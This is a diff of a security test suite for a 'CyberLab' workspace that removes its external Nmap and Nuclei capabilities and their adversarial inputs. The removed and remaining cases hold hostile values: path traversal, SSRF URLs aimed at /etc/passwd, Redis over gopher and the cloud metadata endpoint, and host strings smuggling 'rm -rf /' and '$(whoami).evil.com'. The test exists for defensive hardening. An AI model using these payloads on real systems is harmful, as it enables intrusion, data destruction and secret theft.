@@ -4,8 +4,6 @@ import os from "node:os"
 import path from "node:path"
 import {
   CyberLabWorkspace,
-  ExternalNmapCapability,
-  ExternalNucleiCapability,
   InMemoryPartnerTransport,
   PartnerAuthError,
   PromptChatPartnerTransport,
@@ -150,15 +148,7 @@ describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () =>
         { capabilityId: WorkspaceAuditCapability.id, input: { subpath: "src\0/../../etc" } },
         { capabilityId: WorkspaceAuditCapability.id, input: { subpath: ".git/config" } },
         // Non-HTTP schemes, SSRF & embedded credentials
-        { capabilityId: ExternalNucleiCapability.id, input: { url: "file:///etc/passwd" } },
-        { capabilityId: ExternalNucleiCapability.id, input: { url: "gopher://127.0.0.1:6379/_INFO" } },
-        { capabilityId: ExternalNucleiCapability.id, input: { url: "javascript:alert(1)" } },
-        { capabilityId: ExternalNucleiCapability.id, input: { url: "http://admin:hunter2@127.0.0.1:8080/" } },
-        { capabilityId: ExternalNucleiCapability.id, input: { url: "http://169.254.169.254/latest/api/token" } },
         // Command injection strings in host / out-of-scope public host
-        { capabilityId: ExternalNmapCapability.id, input: { host: "127.0.0.1; rm -rf /", ports: "80" } },
-        { capabilityId: ExternalNmapCapability.id, input: { host: "$(whoami).evil.com", ports: "80" } },
-        { capabilityId: ExternalNmapCapability.id, input: { host: "8.8.8.8", ports: "53" } },
       ]
 
       for (const tc of adversarialCases) {
